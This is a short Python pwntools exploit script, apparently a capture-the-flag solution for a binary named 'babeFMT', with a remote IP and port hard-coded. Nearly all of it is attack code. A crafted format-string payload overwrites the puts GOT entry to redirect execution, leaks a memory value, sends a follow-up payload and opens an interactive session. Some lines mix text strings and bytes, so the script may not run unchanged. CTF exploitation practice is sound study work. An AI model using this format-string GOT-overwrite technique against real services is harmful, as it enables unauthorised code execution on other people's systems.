from pwn import *
import sys
import os

remote_ip,port = '34.126.117.181',2222
binary = 'babeFMT'
brkpts = '''
b*0x804924b
'''

if len(sys.argv)>1:
    io = remote(remote_ip,port)

else:
    io = process(binary)
    
puts = 0x0804c01c
func = 0x08049213

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if __name__== "__main__":
    
    sla("name? : \n","A A A")
    gdb.attach(io,"b*readStr")

    payload = b"%32$s" + b"AAA"
    payload += p32(puts) 
    payload += p32(puts+2)
    payload += "%{}d".format(int(0x9213)-len(payload)-15).encode()
    payload += b"%6$hn"
    payload += "%{}d".format(int(0x10804)-len(payload)-0x200+0x7009).encode()
    payload += b"%7$hn"

    sl(payload)
    leak = u32(io.recv(4))
    log.info("leak @ "+str(hex(leak)))
    sleep(0.2)
   
    string = "a"*(0x100-1-len(payload)-18)

    payload = p32(puts) + p32(puts+2) + "a"*50
    string+= payload
    sl(string)

    io.interactive()
